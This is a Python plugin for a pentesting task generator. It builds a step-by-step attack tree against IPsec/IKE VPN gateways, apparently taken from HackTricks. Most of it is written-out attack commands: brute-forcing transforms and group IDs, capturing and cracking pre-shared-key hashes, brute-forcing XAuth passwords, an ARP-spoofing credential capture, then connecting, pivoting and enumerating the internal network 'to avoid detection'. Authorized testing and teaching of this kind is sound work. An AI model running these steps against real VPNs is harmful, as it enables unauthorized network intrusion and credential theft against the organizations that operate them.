"""
IPsec/IKE VPN service enumeration plugin

Generates tasks for IPsec/IKE enumeration including:
- IKE service discovery
- Valid transformation brute-forcing (encryption/hash/auth/DH group)
- Aggressive mode group ID discovery
- PSK (Pre-Shared Key) capture and cracking
- XAuth username/password brute-forcing
- VPN authentication and connection

Extracted from HackTricks: ipsec-ike-vpn-pentesting.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class IPsecIKEPlugin(ServicePlugin):
    """IPsec/IKE VPN enumeration plugin"""

    @property
    def name(self) -> str:
        return "ipsec-ike"

    @property
    def default_ports(self) -> List[int]:
        return [500, 4500]

    @property
    def service_names(self) -> List[str]:
        return ['isakmp', 'ike', 'ipsec', 'vpn']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect IPsec/IKE VPN services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common ports (500 = IKE, 4500 = NAT-T)
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate IPsec/IKE enumeration task tree"""
        version = service_info.get('version', '')

        tasks = {
            'id': f'ipsec-ike-enum-{port}',
            'name': f'IPsec/IKE VPN Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Discover IKE Service
        tasks['children'].append({
            'id': f'ike-discover-{port}',
            'name': 'IKE Service Discovery',
            'type': 'command',
            'metadata': {
                'command': f'nmap -sU -p {port} {target}',
                'description': 'Verify IPsec/IKE service is running (UDP scan)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RECON'],
                'flag_explanations': {
                    '-sU': 'UDP scan (IKE uses UDP 500)',
                    f'-p {port}': 'Target IKE port',
                },
                'success_indicators': [
                    f'{port}/udp open isakmp',
                    'IKE handshake response',
                    'Service identified',
                ],
                'failure_indicators': [
                    'Port filtered',
                    'No response (firewall or no VPN)',
                ],
                'next_steps': [
                    'Find valid transformation (see transformation discovery task)',
                    'Fingerprint vendor',
                    'Test aggressive mode support',
                ],
                'alternatives': [
                    f'ike-scan -M {target}  # Send IKE main mode packet',
                    f'nc -u {target} {port}  # Manual UDP connection test',
                ],
                'notes': 'Port 500/UDP = IKE Phase 1 (ISAKMP). Port 4500/UDP = NAT Traversal (NAT-T). Service must respond to proceed with enumeration.',
                'estimated_time': '1-2 minutes'
            }
        })

        # TASK 2: Find Valid Transformation
        tasks['children'].append({
            'id': f'ike-transform-{port}',
            'name': 'Find Valid Transformation',
            'type': 'parent',
            'children': [
                {
                    'id': f'ike-scan-default-{port}',
                    'name': 'Test Default Transformations',
                    'type': 'command',
                    'metadata': {
                        'command': f'ike-scan -M {target}',
                        'description': 'Test 8 common transformations in main mode',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            'ike-scan': 'IKE fingerprinting and enumeration tool',
                            '-M': 'Main mode handshake (default)',
                        },
                        'success_indicators': [
                            '1 returned handshake (valid transform found)',
                            'SA=(Enc=3DES Hash=SHA1 Group=2 Auth=PSK ...)',
                            'Encryption, hash, DH group, auth type shown',
                        ],
                        'failure_indicators': [
                            '0 returned handshake; 0 returned notify (not IPsec gateway)',
                            '0 returned handshake; 1 returned notify (none acceptable)',
                        ],
                        'next_steps': [
                            'If handshake received: Note the valid transform (Enc/Hash/Auth/Group)',
                            'If notify received: Brute-force transformations (see brute-force task)',
                            'Check AUTH field: PSK = pre-shared key (vulnerable to aggressive mode attack)',
                            'Fingerprint vendor with --showbackoff',
                        ],
                        'alternatives': [
                            f'ike-scan --aggressive {target}  # Try aggressive mode',
                            f'ikeforce.py {target}  # Automated transformation discovery',
                        ],
                        'notes': 'Transformation = Enc + Hash + Auth + DH Group. PSK auth = good for pentester (crackable). Certificate auth = harder. Group 1/2 (1024-bit MODP) = weak, avoid in production.',
                        'estimated_time': '1-2 minutes'
                    }
                },
                {
                    'id': f'ike-transform-brute-{port}',
                    'name': 'Brute-Force All Transformations',
                    'type': 'command',
                    'metadata': {
                        'command': f'''# Generate all transformations:
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do
  for HASH in 1 2 3 4 5 6; do
    for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do
      for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do
        echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt
      done
    done
  done
done

# Brute-force main mode:
while read line; do
  (echo "Valid trans found: $line" && sudo ike-scan -M $line {target}) | grep -B14 "1 returned handshake" | grep "Valid trans found"
done < ike-dict.txt''',
                        'description': 'Brute-force all possible transformations (thousands of combinations)',
                        'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'SLOW'],
                        'flag_explanations': {
                            'ENC 1-8': 'Encryption: 1=DES, 3=3DES, 5=3IDEA, 7=AES (128/192/256), 8=Camellia',
                            'HASH 1-6': 'Hash: 1=MD5, 2=SHA1, 3=Tiger, 4=SHA2-256, 5=SHA2-384, 6=SHA2-512',
                            'AUTH 1-8,64xxx,65xxx': 'Auth types: 1=PSK, 2=DSS, 3=RSA sig, 4=RSA enc, 64xxx/65xxx=XAUTH variants',
                            'GROUP 1-18': 'DH Groups: 1=768-bit, 2=1024-bit, 14=2048-bit, 15=3072-bit',
                        },
                        'success_indicators': [
                            'Valid transformation echoed (--trans=X,Y,Z,W)',
                            'Handshake returned',
                        ],
                        'failure_indicators': [
                            'No valid transformations found (restrictive config)',
                            'All attempts timeout',
                        ],
                        'next_steps': [
                            'Use found transformation in all subsequent commands',
                            'If aggressive mode needed: try aggressive brute-force',
                            'Prioritize transforms with AUTH=PSK (pre-shared key)',
                        ],
                        'alternatives': [
                            f'ikeforce.py {target}  # Automated tool',
                            'Try aggressive mode brute: while read line; do (echo "Valid: $line" && ike-scan -M --aggressive -P handshake.txt $line {target}) | grep -B7 "SA=" | grep "Valid:"; done < ike-dict.txt',
                        ],
                        'notes': 'DH Group 1/2 = weak (1024-bit, countries can break). Group 14+ = strong (2048-bit+). Cisco recommends avoiding Group 1/2. Brute-force can take several minutes. Stop at first valid transform.',
                        'estimated_time': '10-30 minutes (depends on gateway response time)'
                    }
                }
            ]
        })

        # TASK 3: Vendor Fingerprinting
        tasks['children'].append({
            'id': f'ike-fingerprint-{port}',
            'name': 'VPN Gateway Vendor Fingerprinting',
            'type': 'command',
            'metadata': {
                'command': f'ike-scan -M --showbackoff {target}',
                'description': 'Identify VPN vendor (Cisco, Juniper, Fortinet, etc.)',
                'tags': ['OSCP:MEDIUM', 'ENUM', 'RECON'],
                'flag_explanations': {
                    '--showbackoff': 'Show backoff pattern (timing between retries)',
                },
                'success_indicators': [
                    'Vendor identified (e.g., "Cisco VPN Concentrator")',
                    'VID (Vendor ID) payload shown',
                    'Backoff timing pattern displayed',
                ],
                'failure_indicators': [
                    'No vendor guess',
                    'Generic response',
                ],
                'next_steps': [
                    'Research vendor-specific vulnerabilities',
                    'Cisco: Check for SNMP config dump (if SNMP accessible)',
                    'Adjust attack based on vendor (e.g., Cisco default groups)',
                    'Use vendor-specific tools if available',
                ],
                'alternatives': [
                    f'nmap --script ike-version {target} -p {port}',
                ],
                'notes': 'Vendor fingerprinting via VID payload + backoff timing. Helps tailor attack (e.g., Cisco has known default group names). VID example: 4048b7d5... = IKE Fragmentation support.',
            }
        })

        # TASK 4: Brute-Force Group ID (Aggressive Mode)
        tasks['children'].append({
            'id': f'ike-groupid-{port}',
            'name': 'Brute-Force Group ID (Aggressive Mode)',
            'type': 'parent',
            'children': [
                {
                    'id': f'ike-scan-groupid-{port}',
                    'name': 'Test Fake ID for Response Behavior',
                    'type': 'command',
                    'metadata': {
                        'command': f'ike-scan -P -M -A -n fakeID {target}',
                        'description': 'Test if gateway returns hash for fake ID (determines brute-force method)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'TEST'],
                        'flag_explanations': {
                            '-P': 'Save PSK parameters to file (for cracking)',
                            '-M': 'Main mode (use with -A for aggressive)',
                            '-A': 'Aggressive mode (sends ID in clear)',
                            '-n fakeID': 'Test with fake group ID',
                        },
                        'success_indicators': [
                            'Hash returned even with fake ID (bad - can\'t distinguish valid IDs)',
                            'OR no hash returned (good - reliable brute-force)',
                        ],
                        'failure_indicators': [
                            'No response (aggressive mode disabled)',
                            'Service timeout',
                        ],
                        'next_steps': [
                            'If NO hash returned: Proceed with ike-scan brute-force (reliable)',
                            'If hash returned: Use ikeforce (handles fake hashes)',
                            'If no response: Aggressive mode not supported (stop)',
                        ],
                        'alternatives': [
                            f'ikeforce.py {target} -e  # Automated enumeration',
                        ],
                        'notes': 'Modern VPN gateways send fake hash for invalid IDs (anti-enumeration). Old gateways only respond to valid IDs. This test determines reliability of ID brute-force.',
                    }
                },
                {
                    'id': f'ike-scan-groupid-brute-{port}',
                    'name': 'Brute-Force Group ID with ike-scan',
                    'type': 'command',
                    'metadata': {
                        'command': f'''# Download group ID wordlist:
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/ike-groupid.txt

# Brute-force (use valid transform if found):
while read line; do
  (echo "Found ID: $line" && sudo ike-scan -M -A -n $line {target}) | grep -B14 "1 returned handshake" | grep "Found ID:"
done < ike-groupid.txt''',
                        'description': 'Brute-force group ID with common names (if no fake hashes)',
                        'tags': ['OSCP:HIGH', 'BRUTE_FORCE', 'CRITICAL'],
                        'flag_explanations': {
                            '-M -A': 'Aggressive mode',
                            '-n $line': 'Test each group ID from wordlist',
                            'grep "1 returned handshake"': 'Filter for valid IDs only',
                        },
                        'success_indicators': [
                            'Valid group ID found',
                            'Handshake returned for specific ID',
                            'PSK hash captured (if -P used)',
                        ],
                        'failure_indicators': [
                            'No handshakes returned (no valid IDs in wordlist)',
                            'All attempts timeout',
                        ],
                        'next_steps': [
                            'Once valid ID found: Capture PSK hash (see PSK capture task)',
                            'Try common IDs: "vpn", "ipsec", company name, "default", "remote"',
                            'If all fail: Try ikeforce (different detection methods)',
                        ],
                        'alternatives': [
                            'Use combined wordlist (ikeforce + seclists): https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic',
                            f'ikeforce.py {target} -e -w groupnames.dic',
                        ],
                        'notes': 'Group ID = VPN connection identifier (often called "tunnel group" in Cisco). Not a secret but required for aggressive mode PSK capture. Common: company name, "vpn", "remote", "mobile".',
                        'estimated_time': '5-15 minutes (depends on wordlist size)'
                    }
                },
                {
                    'id': f'ikeforce-groupid-{port}',
                    'name': 'Brute-Force Group ID with ikeforce',
                    'type': 'command',
                    'metadata': {
                        'command': f'''# Install ikeforce:
# git clone https://github.com/SpiderLabs/ikeforce.git
# pip install 'pyopenssl==17.2.0'

./ikeforce.py {target} -e -w ./wordlists/groupnames.dic''',
                        'description': 'Automated group ID discovery with vulnerability-based detection',
                        'tags': ['OSCP:HIGH', 'BRUTE_FORCE', 'AUTOMATED'],
                        'flag_explanations': {
                            'ikeforce.py': 'IKE enumeration tool (exploits multiple vulnerabilities)',
                            '-e': 'Enumeration mode (find group IDs)',
                            '-w': 'Wordlist path',
                        },
                        'success_indicators': [
                            'Valid group ID discovered',
                            'Detection method shown (DPD, packet count, INVALID-ID, etc.)',
                        ],
                        'failure_indicators': [
                            'No valid IDs found',
                            'All methods failed',
                        ],
                        'next_steps': [
                            'Use found ID to capture PSK',
                            'Note detection method used (indicates vulnerability)',
                            'If DPD method: Cisco VPN with Dead Peer Detection enabled',
                        ],
                        'alternatives': [
                            'ike-scan method (if ikeforce unavailable)',
                            f'iker.py {target}  # Alternative tool',
                        ],
                        'notes': 'ikeforce uses 4 detection methods: 1) DPD (Cisco Dead Peer Detection), 2) Packet count differences, 3) INVALID-ID-INFORMATION error, 4) Response presence. Adapts based on gateway behavior. Requires old pyopenssl version.',
                        'estimated_time': '10-20 minutes'
                    }
                }
            ]
        })

        # TASK 5: Capture PSK Hash
        tasks['children'].append({
            'id': f'ike-psk-capture-{port}',
            'name': 'Capture PSK Hash (Aggressive Mode)',
            'type': 'command',
            'metadata': {
                'command': f'ike-scan -M -A -n <GROUP_ID> --pskcrack=psk-hash.txt {target}',
                'description': 'Capture crackable PSK hash using found group ID',
                'tags': ['OSCP:HIGH', 'CRITICAL', 'EXPLOIT'],
                'flag_explanations': {
                    '-M -A': 'Aggressive mode (sends ID in clear, receives PSK hash)',
                    '-n <GROUP_ID>': 'Valid group ID (from brute-force step)',
                    '--pskcrack=psk-hash.txt': 'Save hash to file in psk-crack format',
                },
                'success_indicators': [
                    'Hash saved to psk-hash.txt',
                    'Aggressive mode handshake completed',
                    'Hash format: IP:hash_r:hash_g:...',
                ],
                'failure_indicators': [
                    'No handshake (wrong group ID)',
                    'Aggressive mode disabled',
                    'Empty hash file',
                ],
                'next_steps': [
                    'Crack hash with psk-crack (see cracking task)',
                    'Or use john/hashcat',
                    'Verify hash file contents: cat psk-hash.txt',
                ],
                'alternatives': [
                    f'ikeforce.py {target} -b -i <GROUP_ID> -k <KNOWN_PSK>  # If PSK known, test XAuth',
                ],
                'notes': 'Aggressive mode exposes PSK hash in exchange. Main mode does not. Hash is HMAC-based, crackable offline. Captures SA, nonce, ID, and hash_r/hash_g for cracking.',
                'estimated_time': '1-2 minutes'
            }
        })

        # TASK 6: Crack PSK Hash
        tasks['children'].append({
            'id': f'ike-psk-crack-{port}',
            'name': 'Crack PSK Hash',
            'type': 'parent',
            'children': [
                {
                    'id': f'psk-crack-tool-{port}',
                    'name': 'Crack with psk-crack',
                    'type': 'command',
                    'metadata': {
                        'command': f'psk-crack -d /usr/share/wordlists/rockyou.txt psk-hash.txt',
                        'description': 'Crack PSK using psk-crack (ike-scan\'s cracker)',
                        'tags': ['OSCP:HIGH', 'BRUTE_FORCE'],
                        'flag_explanations': {
                            'psk-crack': 'PSK hash cracker (part of ike-scan)',
                            '-d': 'Dictionary/wordlist path',
                            'psk-hash.txt': 'Captured hash file',
                        },
                        'success_indicators': [
                            'PSK found: <password>',
                            'Plaintext password revealed',
                        ],
                        'failure_indicators': [
                            'Exhausted wordlist (password not in list)',
                            'No match found',
                        ],
                        'next_steps': [
                            'Use PSK + group ID for VPN authentication',
                            'If XAuth enabled: Brute-force username/password (see XAuth task)',
                            'Connect to VPN: vpnc (see connection task)',
                        ],
                        'alternatives': [
                            f'john --wordlist=/usr/share/wordlists/rockyou.txt --format=ikescan psk-hash.txt  # Convert with ikescan2john.py first',
                            f'hashcat -m 5300 psk-hash.txt /usr/share/wordlists/rockyou.txt',
                        ],
                        'notes': 'PSK cracking is offline, fast. Weak PSKs (password123, company name) crack quickly. Strong passphrases take longer. Try company name, common phrases first.',
                        'estimated_time': '5 minutes - hours (depends on password strength)'
                    }
                },
                {
                    'id': f'john-psk-{port}',
                    'name': 'Crack with John the Ripper',
                    'type': 'command',
                    'metadata': {
                        'command': f'''# Convert hash format:
python3 ikescan2john.py psk-hash.txt > john-psk.txt

# Crack:
john --wordlist=/usr/share/wordlists/rockyou.txt john-psk.txt''',
                        'description': 'Use john for PSK cracking (alternative method)',
                        'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE'],
                        'flag_explanations': {
                            'ikescan2john.py': 'Convert ike-scan hash to john format',
                            '--wordlist': 'Password dictionary',
                        },
                        'success_indicators': [
                            'Password cracked and shown',
                            'Saved in ~/.john/john.pot',
                        ],
                        'failure_indicators': [
                            'No passwords cracked',
                        ],
                        'next_steps': [
                            'Show cracked: john --show john-psk.txt',
                            'Use PSK for VPN connection',
                        ],
                        'alternatives': [
                            'Hashcat: hashcat -m 5300 (IKE PSK mode)',
                        ],
                        'notes': 'ikescan2john.py: https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py',
                    }
                }
            ]
        })

        # TASK 7: XAuth Brute-Force (if enabled)
        tasks['children'].append({
            'id': f'ike-xauth-{port}',
            'name': 'XAuth Username/Password Brute-Force',
            'type': 'parent',
            'children': [
                {
                    'id': f'xauth-sniff-{port}',
                    'name': 'Sniff XAuth Credentials (MitM)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Capture XAuth creds via local network MitM',
                        'tags': ['OSCP:LOW', 'MITM', 'ADVANCED'],
                        'success_indicators': [
                            'XAuth username captured',
                            'Password captured (if sent in clear or weak encryption)',
                        ],
                        'next_steps': [
                            'Use fiked to act as VPN endpoint',
                            'ARP spoof to redirect IKE traffic to fiked',
                            'fiked -g <TARGET_IP> -k <GROUP_ID>:<PSK> -l output.txt -d',
                            'Monitor output.txt for XAuth credentials',
                            'Check for default usernames in captured data',
                        ],
                        'alternatives': [
                            'Wireshark: Capture UDP 500/4500, analyze IKE packets',
                            'Block port 500 with firewall, force clear-text fallback (rare)',
                        ],
                        'notes': 'XAuth = Extended Authentication (Phase 1.5). Adds user auth on top of group PSK. Often uses AD/RADIUS. MitM requires local network access. Aggressive mode + PSK + XAuth = double authentication.',
                    }
                },
                {
                    'id': f'xauth-brute-{port}',
                    'name': 'Brute-Force XAuth Credentials',
                    'type': 'command',
                    'metadata': {
                        'command': f'./ikeforce.py {target} -b -i <GROUP_ID> -u <USERNAME> -k <PSK> -w /usr/share/wordlists/rockyou.txt -s 1',
                        'description': 'Brute-force XAuth password (requires group ID + PSK)',
                        'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'NOISY'],
                        'flag_explanations': {
                            '-b': 'Brute-force mode',
                            '-i <GROUP_ID>': 'Valid group ID',
                            '-u <USERNAME>': 'Username to test (or -U for user list)',
                            '-k <PSK>': 'Cracked pre-shared key',
                            '-w': 'Password wordlist',
                            '-s 1': 'Specify transform ID (if needed)',
                        },
                        'success_indicators': [
                            'Valid username:password found',
                            'XAuth authentication successful',
                        ],
                        'failure_indicators': [
                            'All attempts failed',
                            'Account lockout (too many failed attempts)',
                        ],
                        'next_steps': [
                            'Use found creds to connect: vpnc',
                            'Test on other services (SSH, RDP, web portals)',
                            'Check for password reuse',
                        ],
                        'alternatives': [
                            'Use -U flag for username list: -U users.txt',
                            'Try common usernames: admin, vpnuser, remote, <companyname>',
                        ],
                        'notes': 'XAuth brute-force is slow and noisy. May trigger account lockout. Try common/default creds first. Username often follows corporate naming (firstname.lastname).',
                        'estimated_time': '30+ minutes (depends on wordlist and lockout policy)'
                    }
                }
            ]
        })

        # TASK 8: VPN Connection
        tasks['children'].append({
            'id': f'ike-connect-{port}',
            'name': 'Connect to VPN',
            'type': 'command',
            'metadata': {
                'command': f'''# Create vpnc config:
cat > /etc/vpnc/target.conf << STOP
IPSec gateway {target}
IPSec ID <GROUP_ID>
IPSec secret <PSK>
IKE Authmode psk
Xauth username <USERNAME>
Xauth password <PASSWORD>
STOP

# Connect:
vpnc target

# Verify:
ifconfig tun0''',
                'description': 'Authenticate and connect to IPsec VPN',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'ACCESS'],
                'flag_explanations': {
                    'IPSec gateway': 'VPN server IP',
                    'IPSec ID': 'Group ID (from brute-force)',
                    'IPSec secret': 'PSK (from cracking)',
                    'IKE Authmode psk': 'Use pre-shared key authentication',
                    'Xauth username/password': 'User credentials (if XAuth enabled)',
                },
                'success_indicators': [
                    'VPNC started in background (pid: X)',
                    'tun0 interface created',
                    'IP address assigned to tun0',
                    'Routes added to internal network',
                ],
                'failure_indicators': [
                    'Authentication failed (wrong PSK/XAuth creds)',
                    'Connection timeout',
                    'No tun0 interface',
                ],
                'next_steps': [
                    'Check routing: route -n',
                    'Enumerate internal network: nmap -sn <internal_subnet>',
                    'Access internal resources: SMB shares, web apps, databases',
                    'Pivot to internal hosts',
                    'Disconnect: vpnc-disconnect',
                ],
                'alternatives': [
                    'StrongSwan: ipsec up <connection_name>',
                    'OpenConnect: openconnect --protocol=anyconnect <gateway>',
                ],
                'notes': 'VPNC = Cisco IPsec VPN client. Config in /etc/vpnc/. Once connected, you\'re inside the corporate network. Treat as lateral movement. Enumerate carefully to avoid detection.',
            }
        })

        # TASK 9: Reference Material & Resources
        tasks['children'].append({
            'id': f'ike-references-{port}',
            'name': 'Study Reference Material',
            'type': 'manual',
            'metadata': {
                'description': 'Read in-depth IPsec/IKE pentesting guides',
                'tags': ['OSCP:LOW', 'RESEARCH', 'LEARNING'],
                'success_indicators': [
                    'Understand IKE phases (Phase 1, 1.5, 2)',
                    'Know SA, ESP, AH protocols',
                    'Understand PFS (Perfect Forward Secrecy)',
                ],
                'next_steps': [
                    'Read: PSK cracking paper (http://www.ernw.de/download/pskattack.pdf)',
                    'Read: SecurityFocus Infocus (http://www.securityfocus.com/infocus/1821)',
                    'Read: Scanning IKE with ike-scan (http://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf)',
                    'Book: Network Security Assessment 3rd Edition (Chapter on VPNs)',
                    'Shodan: port:500 IKE (find exposed VPN gateways)',
                ],
                'alternatives': [
                    'HackTricks: https://book.hacktricks.wiki/network-services-pentesting/ipsec-ike-vpn-pentesting',
                ],
                'notes': 'IKE Phases: Phase 1 = establish secure channel (PSK/cert). Phase 1.5 = XAuth user auth. Phase 2 = negotiate ESP/AH for data encryption. PFS = new DH exchange per session (prevents key compromise cascade).',
            }
        })

        # TASK 10: Shodan Reconnaissance
        tasks['children'].append({
            'id': f'ike-shodan-{port}',
            'name': 'Shodan/Censys IPsec Reconnaissance',
            'type': 'manual',
            'metadata': {
                'description': 'Find exposed IPsec VPN gateways on internet',
                'tags': ['OSCP:LOW', 'RESEARCH', 'RECON'],
                'success_indicators': [
                    'Exposed VPN gateways found',
                    'Vendor information gathered',
                    'Vulnerable versions identified',
                ],
                'next_steps': [
                    'Shodan: port:500 IKE',
                    'Shodan: port:4500 NAT-T',
                    'Shodan: "cisco" port:500',
                    'Censys: services.port:500',
                    'Check if target IP in results',
                    'Analyze vendor distribution',
                ],
                'alternatives': [
                    'Censys.io web interface',
                    'Google: site:shodan.io ipsec',
                ],
                'notes': 'Thousands of VPN gateways exposed. Many use weak DH groups (1/2). Aggressive mode + weak PSK = common. Report findings responsibly.',
            }
        })

        return tasks
